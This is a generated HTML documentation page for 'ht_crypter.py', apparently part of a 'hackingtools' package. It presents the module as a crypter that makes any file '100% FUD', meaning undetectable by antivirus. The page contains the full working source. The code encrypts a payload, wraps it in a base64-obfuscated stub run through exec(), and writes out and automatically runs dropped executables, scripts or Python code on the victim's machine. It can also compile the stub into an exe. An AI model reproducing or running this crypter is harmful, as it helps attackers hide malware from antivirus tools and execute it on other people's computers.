<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8">
  <title>ht_crypter.py</title>
  <link rel="stylesheet" href="..\..\..\..\..\..\pycco.css">
</head>
<body>
<div id='container'>
  <div id="background"></div>
  <div class='section'>
    <div class='docs'><h1>ht_crypter.py</h1></div>
  </div>
  <div class='clearall'>
  <div class='section' id='section-0'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-0'>#</a>
      </div>
      <h3><span id="crypts-any-file-using-ht_rsa-module-and-some-utils.-for-now,-is-fud-100%" href="crypts-any-file-using-ht_rsa-module-and-some-utils.-for-now,-is-fud-100%"> Crypts any file using ht_rsa module and some Utils. For now, is FUD 100% </span></h3>
    </div>
    <div class='code'>
      <div class="highlight"><pre><span></span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-1'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-1'>#</a>
      </div>
      <p>With this module, we can crypt any file we want 
for not been detected, for example, by antiviruses.
Currently it support&rsquo;s the following 2 public functions and 4 private functions:</p>
<p>Public:</p>
<ol>
<li>
<p><strong>crypt_file</strong> - Crypts any file with ht_rsa functions and some utils and returns crypted file 100% FUD (jump to section in  <a href="ht_crypter.html#crypt_file">ht_crypter.py</a> )</p>
</li>
<li>
<p><strong>createStub</strong> - Creates a file with the stub (decrypt functions and pk for rsa) included into the file for been 100% FUD (jump to section in  <a href="ht_crypter.html#createStub">ht_crypter.py</a> )</p>
</li>
</ol>
<h1>TODO MORE HEREEE</h1>
    </div>
    <div class='code'>
      <div class="highlight"><pre><span class="kn">from</span> <span class="nn">hackingtools.core</span> <span class="kn">import</span> <span class="n">Logger</span><span class="p">,</span> <span class="n">Config</span><span class="p">,</span> <span class="n">Utils</span>
<span class="kn">import</span> <span class="nn">hackingtools</span> <span class="kn">as</span> <span class="nn">ht</span> 

<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">argparse</span> <span class="kn">import</span> <span class="n">ArgumentParser</span>
<span class="kn">import</span> <span class="nn">os.path</span>
<span class="kn">import</span> <span class="nn">math</span>
<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">shutil</span>

<span class="n">config</span> <span class="o">=</span> <span class="n">Config</span><span class="o">.</span><span class="n">getConfig</span><span class="p">(</span><span class="n">parentKey</span><span class="o">=</span><span class="s1">&#39;modules&#39;</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="s1">&#39;ht_crypter&#39;</span><span class="p">)</span>
<span class="n">output_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="s1">&#39;output&#39;</span><span class="p">))</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-2'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-2'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre><span class="k">class</span> <span class="nc">StartModule</span><span class="p">():</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-3'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-3'>#</a>
      </div>
      <h3><span id="__init__" href="__init__"> <strong>init</strong> </span></h3>
    </div>
    <div class='code'>
      <div class="highlight"><pre>	<span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">Utils</span><span class="o">.</span><span class="n">emptyDirectory</span><span class="p">(</span><span class="n">output_dir</span><span class="p">)</span>
		<span class="k">pass</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-4'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-4'>#</a>
      </div>
      <h3><span id="help" href="help"> help </span></h3>
    </div>
    <div class='code'>
      <div class="highlight"><pre>	<span class="k">def</span> <span class="nf">help</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="n">Logger</span><span class="o">.</span><span class="n">printMessage</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="n">ht</span><span class="o">.</span><span class="n">getFunctionsNamesFromModule</span><span class="p">(</span><span class="s1">&#39;ht_crypter&#39;</span><span class="p">))</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-5'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-5'>#</a>
      </div>
      <h3><span id="converttoexe" href="converttoexe"> convertToExe </span></h3>
    </div>
    <div class='code'>
      <div class="highlight"><pre>	<span class="k">def</span> <span class="nf">convertToExe</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">stub_name</span><span class="p">):</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-6'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-6'>#</a>
      </div>
      <pre><code>    Convert's given Python file path in String into a new one with the same name and .exe as extension
    Compile's with pyinstaller and could be change it's params in config.json

    Arguments
    ---------
        stub_name : str

            File path to convert to exe
</code></pre>
    </div>
    <div class='code'>
      <div class="highlight"><pre>		<span class="n">Logger</span><span class="o">.</span><span class="n">printMessage</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s1">&#39;{methodName}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">methodName</span><span class="o">=</span><span class="s1">&#39;convertToExe&#39;</span><span class="p">),</span> <span class="n">description</span><span class="o">=</span><span class="s1">&#39;{stub_name}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stub_name</span><span class="o">=</span><span class="n">stub_name</span><span class="p">),</span> <span class="n">debug_module</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-7'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-7'>#</a>
      </div>
      <p>Convert py to exe with pyinstaller</p>
    </div>
    <div class='code'>
      <div class="highlight"><pre>		<span class="kn">import</span> <span class="nn">os</span>
		<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;pyinstaller&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">stub_name</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">stub_name</span><span class="p">)</span>
		<span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;{file}.exe&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">stub_name</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

		<span class="n">file_to_move</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;dist&#39;</span><span class="p">,</span> <span class="s1">&#39;{file}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">filename</span><span class="p">)))</span>
		<span class="n">new_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">stub_name</span><span class="p">),</span> <span class="n">filename</span><span class="p">))</span>

		<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_to_move</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">new_file</span><span class="p">):</span>
			<span class="n">os</span><span class="o">.</span><span class="n">rename</span><span class="p">(</span><span class="n">file_to_move</span><span class="p">,</span> <span class="n">new_file</span><span class="p">)</span>

		<span class="n">new_spec_file</span> <span class="o">=</span> <span class="s1">&#39;{name}.spec&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">new_file</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
		<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">new_spec_file</span><span class="p">):</span>
			<span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">new_spec_file</span><span class="p">)</span>

		<span class="n">build_dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;build&#39;</span><span class="p">,</span> <span class="s1">&#39;{file}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">filename</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])))</span>
		<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">build_dir</span><span class="p">):</span>
			<span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">build_dir</span><span class="p">)</span>

		<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">file_to_move</span><span class="p">):</span>
			<span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">file_to_move</span><span class="p">)</span>

		<span class="n">spec_file</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="s1">&#39;{file}.spec&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">filename</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
		<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">spec_file</span><span class="p">):</span>
			<span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">spec_file</span><span class="p">)</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-8'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-8'>#</a>
      </div>
      <h3><span id="createstub" href="createstub"> createStub </span></h3>
    </div>
    <div class='code'>
      <div class="highlight"><pre>	<span class="k">def</span> <span class="nf">createStub</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">crypto_data_hex</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">drop_file_name</span><span class="p">,</span> <span class="n">save_name</span><span class="p">,</span> <span class="n">is_iterating</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">is_last</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">convert</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-9'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-9'>#</a>
      </div>
      <pre><code>    Create's the stub for the crypter and 
    has some courious params he have to see

    Arguments
    ---------
        crypto_data_hex : str

            File path that want to crypt
        public_key : str

            New File name for crypted file when 
            return's it
        drop_file_name : str
            New File name for crypted file when 
            return's it
        save_name : str
            New File name for crypted file when 
            return's it

    Keyword Arguments:
        is_iterating : bool

            Compile's the final file if we select 
            it (default: {False})
        is_last : bool

            Internal variable for looping on the 
            crypting (default: {False})
        convert : bool

            Internal varuable for looping on the 
            crypting (default: {1})

    Returns
    -------
        str

            Crypted file path name / None
</code></pre>
    </div>
    <div class='code'>
      <div class="highlight"><pre>		<span class="n">stub</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
		<span class="k">if</span> <span class="n">is_last</span><span class="p">:</span>
			<span class="n">stub</span> <span class="o">=</span> <span class="s2">&quot;import argparse, math, base64, binascii, random, sys, subprocess, os</span><span class="se">\n</span><span class="s2">from random import randint</span><span class="se">\n</span><span class="s2">&quot;</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;cdx = </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">crypto_data_hex</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;\n</span><span class="s2">&quot;</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;drpnm = </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">drop_file_name</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;\n</span><span class="s2">&quot;</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;pk = ({a}, {b})</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">public_key</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">b</span><span class="o">=</span><span class="n">public_key</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">#DIVIDER</span>
<span class="s2">def dcy(pk, cptx):</span>
<span class="s2">	k, n = pk</span>
<span class="s2">	mensajeRecibido = __reBa64__(cptx.encode(&#39;utf-8&#39;))</span>
<span class="s2">	mensajeHexRecibido = __ba64Hex__(mensajeRecibido)</span>
<span class="s2">	mensajeDecimalRecibido = __hexDec__(mensajeHexRecibido)</span>
<span class="s2">	mensajeDescifrado = [((c ** k) % n) for c in mensajeDecimalRecibido]</span>
<span class="s2">	mensaje_de_ascii = __deAS__(mensajeDescifrado)</span>
<span class="s2">	decasc = __reBa64__(&#39;&#39;.join(mensaje_de_ascii).encode())</span>
<span class="s2">	hexba64 = __ba64Hex__(decasc)</span>
<span class="s2">	ashex = __hexDec__(hexba64)</span>
<span class="s2">	deasc = __deAS__(ashex)</span>
<span class="s2">	ba64 = base64.b64decode(deasc.encode())</span>
<span class="s2">	return ba64</span>
<span class="s2">#DIVIDER</span>
<span class="s2">def __reBa64__(m):</span>
<span class="s2">	mBa64 = [m[i:i+4] for i in range(0, len(m), 4)]</span>
<span class="s2">	return mBa64</span>
<span class="s2">#DIVIDER</span>
<span class="s2">def __ba64Hex__(m):</span>
<span class="s2">	mHx = [base64.b64decode(b64) for b64 in m]</span>
<span class="s2">	return mHx</span>
<span class="s2">#DIVIDER</span>
<span class="s2">def __hexDec__(m):</span>
<span class="s2">	mDec = [int(hexa.decode(&quot;UTF-8&quot;), 16) for hexa in m]</span>
<span class="s2">	return mDec</span>
<span class="s2">#DIVIDER</span>
<span class="s2">def __deAS__(m):</span>
<span class="s2">	m1 = &#39;&#39;.join([chr(d) for d in m])</span>
<span class="s2">	return m1</span>
<span class="s2">#DIVIDER</span>
<span class="s2">def __meAS__(m):</span>
<span class="s2">	men = [ord(p) for p in m]</span>
<span class="s2">	return men</span>
<span class="s2">dcy_data = dcy(pk=pk, cptx=cdx)</span>
<span class="s2">&quot;&quot;&quot;</span>
		<span class="k">if</span> <span class="n">is_iterating</span><span class="p">:</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;cdx = </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">crypto_data_hex</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;\n</span><span class="s2">&quot;</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;pk = ({a}, {b})</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">a</span><span class="o">=</span><span class="n">public_key</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">b</span><span class="o">=</span><span class="n">public_key</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;dcy_data = dcy(pk=pk, cptx=cdx)</span><span class="se">\n</span><span class="s2">&quot;</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;exec(dcy_data)&quot;</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">image_extensions = (&#39;jpg&#39;, &#39;jpeg&#39;, &#39;bpm&#39;, &#39;ico&#39;, &#39;png&#39;)</span>
<span class="s2">exec_extensions = (&#39;bat&#39;, &#39;exe&#39;, &#39;vbs&#39;, &#39;ps1&#39;)</span>
<span class="s2">python_extensions = (&#39;py&#39;)</span>
<span class="s2">nf = open(drpnm, &#39;wb&#39;)</span>
<span class="s2">try:</span>
<span class="s2">	nf.write(dcy_data)</span>
<span class="s2">except:</span>
<span class="s2">	pass</span>
<span class="s2">nf.close()</span>
<span class="s2">if os.path.exists(drpnm):</span>
<span class="s2">	if drpnm.split(&#39;.&#39;)[1] in image_extensions:</span>
<span class="s2">		imageViewerFromCommandLine = {&#39;linux&#39;:&#39;xdg-open&#39;, &#39;win32&#39;:&#39;explorer&#39;, &#39;darwin&#39;:&#39;open&#39;}[sys.platform]</span>
<span class="s2">		subprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)</span>
<span class="s2">	if drpnm.split(&#39;.&#39;)[1] in exec_extensions and sys.platform == &#39;win32&#39;:</span>
<span class="s2">		os.system(drpnm)</span>
<span class="s2">	if drpnm.split(&#39;.&#39;)[1] in python_extensions:</span>
<span class="s2">		exec(dcy_data)</span>
<span class="s2">		proc = subprocess.Popen(&#39;python {fn}&#39;.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span>
<span class="s2">&quot;&quot;&quot;</span>

		<span class="n">stub_base64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">stub</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
		<span class="n">stub</span> <span class="o">=</span> <span class="s2">&quot;import base64</span><span class="se">\n</span><span class="s2">&quot;</span>
		<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;data = {st_ba64}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">st_ba64</span><span class="o">=</span><span class="n">stub_base64</span><span class="p">)</span>
		<span class="n">stub</span> <span class="o">+=</span> <span class="s2">&quot;exec(base64.b64decode(data))&quot;</span>
		
		<span class="n">Utils</span><span class="o">.</span><span class="n">saveToFile</span><span class="p">(</span><span class="n">content</span><span class="o">=</span><span class="n">stub</span><span class="p">,</span> <span class="n">fileName</span><span class="o">=</span><span class="n">save_name</span><span class="p">)</span>

		<span class="k">if</span> <span class="n">convert</span><span class="p">:</span>
			<span class="bp">self</span><span class="o">.</span><span class="n">convertToExe</span><span class="p">(</span><span class="n">save_name</span><span class="p">)</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-10'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-10'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre>	<span class="k">def</span> <span class="nf">crypt_file</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">new_file_name</span><span class="p">,</span> <span class="n">drop_file_name</span><span class="o">=</span><span class="s1">&#39;dropped.py&#39;</span><span class="p">,</span> <span class="n">prime_length</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">compile_exe</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">is_iterating</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">iterate_count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">is_last</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-11'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-11'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre>		<span class="n">Logger</span><span class="o">.</span><span class="n">printMessage</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s1">&#39;{methodName}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">methodName</span><span class="o">=</span><span class="s1">&#39;crypt_file&#39;</span><span class="p">),</span> <span class="n">description</span><span class="o">=</span><span class="s1">&#39;{filename}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">filename</span><span class="p">),</span> <span class="n">debug_module</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
		<span class="n">temp_filename</span> <span class="o">=</span> <span class="n">filename</span>
		<span class="k">if</span> <span class="n">iterate_count</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
			<span class="n">temp_filename</span> <span class="o">=</span> <span class="n">filename</span>
			<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">iterate_count</span><span class="p">):</span>
				<span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">iterate_count</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
					<span class="n">is_last</span> <span class="o">=</span> <span class="bp">True</span>
				<span class="n">temp_filename</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">crypt_file</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="n">temp_filename</span><span class="p">,</span> <span class="n">new_file_name</span><span class="o">=</span><span class="n">new_file_name</span><span class="p">,</span> <span class="n">drop_file_name</span><span class="o">=</span><span class="n">drop_file_name</span><span class="p">,</span> <span class="n">compile_exe</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">is_iterating</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">iterate_count</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">is_last</span><span class="o">=</span><span class="n">is_last</span><span class="p">)</span>
		
		<span class="n">filename</span> <span class="o">=</span> <span class="n">temp_filename</span>
		<span class="k">if</span> <span class="n">filename</span> <span class="ow">and</span> <span class="n">new_file_name</span><span class="p">:</span>
			<span class="n">crypter_rsa</span> <span class="o">=</span> <span class="n">ht</span><span class="o">.</span><span class="n">getModule</span><span class="p">(</span><span class="s1">&#39;ht_rsa&#39;</span><span class="p">)</span>
			<span class="n">data</span> <span class="o">=</span> <span class="n">Utils</span><span class="o">.</span><span class="n">getFileContentInByteArray</span><span class="p">(</span><span class="n">filePath</span><span class="o">=</span><span class="n">filename</span><span class="p">)</span>
			<span class="n">prime_a</span><span class="p">,</span> <span class="n">prime_b</span> <span class="o">=</span> <span class="n">crypter_rsa</span><span class="o">.</span><span class="n">getRandomKeypair</span><span class="p">(</span><span class="n">prime_length</span><span class="p">)</span>
			<span class="n">public</span><span class="p">,</span> <span class="n">private</span> <span class="o">=</span> <span class="n">crypter_rsa</span><span class="o">.</span><span class="n">generate_keypair</span><span class="p">(</span><span class="n">prime_a</span><span class="p">,</span> <span class="n">prime_b</span><span class="p">)</span>
			<span class="n">crypted_data</span> <span class="o">=</span> <span class="n">crypter_rsa</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">private_key</span><span class="o">=</span><span class="n">private</span><span class="p">,</span> <span class="n">plaintext</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
			<span class="n">new_file</span> <span class="o">=</span> <span class="n">new_file_name</span>
			<span class="k">if</span> <span class="ow">not</span> <span class="s1">&#39;.&#39;</span> <span class="ow">in</span> <span class="n">new_file</span><span class="p">:</span>
				<span class="n">new_file</span> <span class="o">=</span> <span class="s1">&#39;{file}.py&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">new_file</span><span class="p">)</span>

			<span class="k">if</span> <span class="n">compile_exe</span><span class="p">:</span>
				<span class="bp">self</span><span class="o">.</span><span class="n">createStub</span><span class="p">(</span><span class="n">crypto_data_hex</span><span class="o">=</span><span class="n">crypted_data</span><span class="p">,</span> <span class="n">public_key</span><span class="o">=</span><span class="n">public</span><span class="p">,</span> <span class="n">drop_file_name</span><span class="o">=</span><span class="n">drop_file_name</span><span class="p">,</span> <span class="n">save_name</span><span class="o">=</span><span class="n">new_file</span><span class="p">,</span> <span class="n">is_iterating</span><span class="o">=</span><span class="n">is_iterating</span><span class="p">,</span> <span class="n">is_last</span><span class="o">=</span><span class="n">is_last</span><span class="p">,</span> <span class="n">convert</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
				<span class="n">new_file</span> <span class="o">=</span> <span class="s1">&#39;{file}.exe&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">new_file</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="bp">self</span><span class="o">.</span><span class="n">createStub</span><span class="p">(</span><span class="n">crypto_data_hex</span><span class="o">=</span><span class="n">crypted_data</span><span class="p">,</span> <span class="n">public_key</span><span class="o">=</span><span class="n">public</span><span class="p">,</span> <span class="n">drop_file_name</span><span class="o">=</span><span class="n">drop_file_name</span><span class="p">,</span> <span class="n">save_name</span><span class="o">=</span><span class="n">new_file</span><span class="p">,</span> <span class="n">is_iterating</span><span class="o">=</span><span class="n">is_iterating</span><span class="p">,</span> <span class="n">is_last</span><span class="o">=</span><span class="n">is_last</span><span class="p">)</span>
			<span class="k">return</span> <span class="n">new_file</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="bp">None</span>

</pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-12'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-12'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-13'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-13'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-14'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-14'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-15'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-15'>#</a>
      </div>
      
    </div>
    <div class='code'>
      <div class="highlight"><pre></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-16'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-16'>#</a>
      </div>
      <p>=== crypt_file ===
Crypt&rsquo;s a file when some params we have to use</p>
    </div>
    <div class='code'>
      <div class="highlight"><pre></pre></div>
    </div>
  </div>
  <div class='clearall'></div>
  <div class='section' id='section-17'>
    <div class='docs'>
      <div class='octowrap'>
        <a class='octothorpe' href='#section-17'>#</a>
      </div>
      <pre><code>    
    Arguments
    ---------
        filename : str

            File path that want to crypt
        new_file_name : str

            New File name for crypted file 
            when return's it

    Keyword Arguments
    -----------------
        drop_file_name : str

            Drop a new file on execute the 
            cryted file (default: {'dropped.py'})
        prime_length : int

            Set a prime length for auto-generating
             the primes for the cryptography 
             (default: {4})
        compile_exe : bool

            Compile's the final file if 
            we select it (default: {False})
        is_iterating : bool

            Internal variable for looping 
